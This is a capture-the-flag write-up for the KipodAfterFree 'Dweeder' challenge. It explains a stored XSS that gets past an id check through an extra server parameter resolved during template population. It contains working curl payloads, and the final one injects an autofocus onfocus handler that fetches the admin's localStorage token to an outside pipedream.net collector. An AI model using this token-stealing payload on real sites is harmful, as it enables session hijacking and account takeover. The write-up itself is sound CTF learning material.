# Dweeder - KipodAfterFree

## Understanding
Users are allowed to compose titles and contents and submit them to the server. When @shuky is used, the admin will visit the new submissions and check them out. If the site does not sanitize the user inputs properly, malicious scripts can be injected and executed. 

When a user click on the ``send Dweed!`` button, sendDweed() is invoked and the following function is involved:
```javascript
# This function sends a json query to the dweed server. The query is of a json type, consisting of the following parameters: token, title, contents. Two of the parameters, without doubts, are under user's controls (i.e., title, contents). Upon success, the server returns a dweed id, and the function redirects the user to a new url with respect to the dweed id.
function writeDweed() {
    API.call("dweeder", "writeDweed", {
        token: window.localStorage.getItem("token"),
        title: UI.read("write-title"),
        contents: UI.read("write-contents")
    }).then((id) => {
        window.location = "?dweed=" + id;
    }).catch(alert);
}
```

When a dweed is rendered, either by listener or an explicit click on the Feed menu, the following functions are involved:
```javascript
# readDweed is called to obtain a dweed info from the server
function readDweed(id) {
    return new Promise((resolve, reject) => {
        API.call("dweeder", "readDweed", {
            token: window.localStorage.getItem("token"),
            id: id
        }).then((dweed) => {
            ...
            resolve(dweed);
        }).catch(reject);
    });
}
# then insertDweed is called to validate a dweed id before writing the dweed back into the HTML template
function insertDweed(dweed) {
    ...
    // Make sure id is valid
    if (dweed.id.length > 28)
        return;
    for (let char of dweed.id)
        if ("0123456789 abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ !@#$%^&*()_-+={}|".includes(char) === false)
            return;
    // Add the dweed
    UI.find("dweeds").appendChild(UI.populate(template, dweed));
}
```
While populating the dweed, all user-supplied parameters are iterated and are replaced with their values. At the same time, their contents are also sanitized:
```javascript
static populate(template, parameters = {}) {
  ...
  // Sanitize value using the default HTML sanitiser of the target browser
  let sanitizer = document.createElement("p");
  sanitizer.innerText = value;
  value = sanitizer.innerHTML;
}
```

## Enumerating

After a few submissions, we can observe that the two parameters (i.e., title and contents) are properly filtered not only on the server side, but also on the client side (by the HTML sanitiser).

However, the server allows us to create new parameters, which can help us by pass the sanitization on the server side. Let's check this out:
```bash
# 1st attempt
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"313630353134353638306f676771","status":true} # Server responses

curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&id=313630353134353638306f676771" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?readDweed
{"result":{"title":"a","contents":"a","time":"01:48","handle":"test213"},"status":true} # Server responses

# 2nd attempt
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&myvar=a" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"313630353134353939396e70326e","status":true}

curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&id=3136303531343638333436366d64" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?readDweed
{"result":{"title":"a","contents":"a","myvar":"ajavascript:alert(1)\"","time":"02:07","handle":"test213"},"status":true}

# 3rd attempt
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&id=ajavascript:alert(1)\"" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"3136303531343730333175707a74","status":true}

```
From 3 attempts, we concluded a few things:
- In the 1st attempt, we knew all the parameters that the server was expecting
- In the second, we observed that the server allowsedcreation of new parameters
- In the third, we knew that the id parameter was not properly sanitized on the server side. Strangely enough, we could have still visited the dweed using the numeric ID provided by the server. This gave us another hint: server actually uses two types of ID for a dweed, but for what purpose then? 

## Exploiting
The 3rd attempt told us that we needed to look into the id field. We tried to inject code into the id parameter to close the double quote.
```bash
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&id=\"" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"3136303531343736343936676d33","status":true}
```
However, visiting the dweed renders nothing at this time. This was because the check within the insertDweed() found out that there was an illegal character "\" in the id's value, so it immediately returned. 

Fortunately, since the server allowed new parameter creation(e.g.,$myvar), and since ``$myvar`` would be resolved after the check, we temporarily assigned id = ${myvar} in order to pass the first check. Later, ${myvar} would be resolved during template population. Note that we need to escape the dollar sign. 

```bash
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&id=\${myvar}&myvar='\" tabindex=1 onfocus=\"alert(1)\" autofocus " -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"3136303531353834353431386f30","status":true}
```
Using Chrome, we immediately saw the pop-up. Chrome automatically applies focus on the div with highest priority (1). It was not clear why this pop-up was not shown in Firefox, which requires user to click on the div area. Next, we changed the alert(1) to malicious code that fetches victim token.

```bash
curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=@shuky&id=\${myvar}&myvar='\" tabindex=1 onfocus=\"fetch('https://3b33c4880500a943a57f89f4574b6024.m.pipedream.net/?token='%2BlocalStorage.getItem('token'))\" autofocus " -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
{"result":"3136303531363031373273703868","status":true}
```
Decoding the victim token, we obtained the flag:{"expiry":null,"content":{"name":"KAF{_w3ll_th4t5_wh4t_b4d_c0d3_l00k5_l1ke}","handle":"shuky"}}


